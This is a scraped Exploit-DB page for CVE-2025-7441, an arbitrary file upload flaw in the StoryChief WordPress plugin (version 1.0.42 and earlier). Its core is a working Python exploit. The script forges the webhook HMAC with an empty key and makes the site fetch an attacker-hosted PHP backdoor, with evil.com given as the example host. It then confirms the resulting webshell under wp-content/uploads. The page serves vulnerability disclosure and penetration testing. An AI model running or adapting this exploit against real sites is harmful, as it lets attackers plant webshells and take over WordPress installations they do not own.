---
title: [webapps] StoryChief Wordpress Plugin 1.0.42 - Arbitrary File Upload
url: https://www.exploit-db.com/exploits/52422
source: Exploit-DB.com RSS Feed
date: 2025-08-27
fetch_date: 2025-10-07T00:47:59.294904
---

# [webapps] StoryChief Wordpress Plugin 1.0.42 - Arbitrary File Upload

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# StoryChief Wordpress Plugin 1.0.42 - Arbitrary File Upload

#### EDB-ID:

###### 52422

#### CVE:

###### [2025-7441](https://nvd.nist.gov/vuln/detail/CVE-2025-7441)

---

**EDB Verified:**

#### Author:

###### [xpl0dec](/?author=12313)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-26

---

**Vulnerable App:**

```
# Exploit Title: StoryChief Wordpress Plugin 1.0.42 - Arbitrary File Upload
# Exploit Author: xpl0dec
# Vendor Homepage: https://www.storychief.io/wordpress-content-scheduler
# Software Link: https://github.com/Story-Chief/wordpress/
# Version: <= 1.0.42
# Tested on: Linux
# CVE : CVE-2025-7441
# CVSS Score : 9.8

# Step to reproduce :
# 1. Create a file with the .php extension and fill it with:
# <?php
# header(“Content-Type: image/jpeg”);
# echo “<?php phpinfo(); ?>”;
# ?>
# 2. Adjust the echo phpinfo section as needed
# 3. Host it on a VPS/web server with the name you want to upload, for example backdoor.php
# 4. The second argument is the URL of the backdoor created earlier, e.g., http://evil.com/backdoor.php
# 5. Then run the exploit: python3 CVE-2025-7441.py <wordpress_url> <backdoor_url>

from datetime import datetime
import requests
import json
import hmac
import hashlib
import sys
import time
import os

def banner():
	print(r"""
  _   _  ____ _____ _   _ _____ _  __  ____    _ __   __
 | \ | |/ ___| ____| | | | ____| |/ / |  _ \  / \\ \ / /
 |  \| | |  _|  _| | |_| |  _| | ' /  | | | |/ _ \\ V /
 | |\  | |_| | |___|  _  | |___| . \  | |_| / ___ \| |
 |_| \_|\____|_____|_| |_|_____|_|\_\ |____/_/   \_\_|

  PoC exploit CVE-2025-7441 by xpl0dec
	""")

if __name__ == "__main__":
    banner()
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_url> <backdoor_url>")
        sys.exit(1)

    url = sys.argv[1] + "/wp-json/storychief/webhook"

    dummy = {
        "meta": {
            "event": "publish"
        },
        "data": {
            "featured_image": {
                "data": {
                    "sizes": {
                        "full": sys.argv[2]
                    }
                }
            }
        }
    }

    json_string = json.dumps(dummy, separators=(',', ':'), ensure_ascii=True)
    json_string = json_string.replace("/", "\\/").encode()

    signature = hmac.new(
        "".encode(),
        json_string,
        digestmod=hashlib.sha256
    ).hexdigest()

    headers = {
        "Content-Type": "application/json"
    }

    payload = {
        "meta": {
            "mac" : signature,
            "event": "publish"
        },
        "data": {
            "featured_image": {
                "data": {
                    "sizes": {
                        "full": sys.argv[2]
                    }
                }
            }
        }
    }

    print("[+] get hmac... [+]")
    time.sleep(2)
    print("hmac : " + signature)

    response = requests.post(url, headers=headers, data=json.dumps(payload))

    if "permalink" in response.text:
        print("[+] Response Success [+]")
        time.sleep(2)
        print("[+] Check backdoor from uploaded... [+]")

    current_datetime = datetime.now()
    month = str(current_datetime.month).zfill(2)
    year = current_datetime.year
    file_backdoor = os.path.basename(sys.argv[2])

    get_backdoor = requests.get(sys.argv[1] + f"/wp-content/uploads/{year}/{month}/{file_backdoor}")

    if get_backdoor.status_code == 200:
        print("[+] Exploitation Success [+]")
        time.sleep(2)
        print("webshell uploaded in : " + sys.argv[1] + f"/wp-content/uploads/{year}/{month}/{file_backdoor}")
```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| --- | --- | --- | --- |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) |

Databases

[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links

[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites

[OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com/)

Solutions

[Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database...